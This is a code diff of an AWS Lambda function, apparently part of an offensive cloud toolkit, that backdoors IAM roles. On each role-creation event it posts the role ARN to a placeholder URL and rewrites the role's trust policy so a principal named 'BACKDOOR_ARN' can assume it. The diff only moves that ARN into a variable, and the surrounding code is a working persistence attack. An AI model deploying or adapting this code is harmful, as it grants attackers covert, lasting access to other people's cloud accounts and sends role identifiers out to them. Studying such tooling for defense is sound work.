@@ -13,6 +13,7 @@ def lambda_handler(event,context):
         requests.post('POST_URL',data={"RoleArn":event['detail']['responseElements']['role']['arn']})
     return
 def handle_change(original):
+    arn='BACKDOOR_ARN'
     if 'Statement' in original:
         statements=original['Statement']
         for statement in statements:
@@ -20,11 +21,11 @@ def handle_change(original):
                 if 'Principal' in statement and isinstance(statement['Principal'],dict):
                     if 'AWS' in statement['Principal']:
                         if isinstance(statement['Principal']['AWS'],list):
-                            statement['Principal']['AWS'].append('BACKDOOR_ARN')
+                            statement['Principal']['AWS'].append(arn)
                         else:
-                            statement['Principal']['AWS']=[statement['Principal']['AWS'],'BACKDOOR_ARN']
+                            statement['Principal']['AWS']=[statement['Principal']['AWS'],arn]
                     else:
-                        statement['Principal']['AWS']='BACKDOOR_ARN'
+                        statement['Principal']['AWS']=arn
                 elif 'Principal' not in statement:
-                    statement['Principal']={'AWS':'BACKDOOR_ARN'}
+                    statement['Principal']={'AWS':arn}
     return original
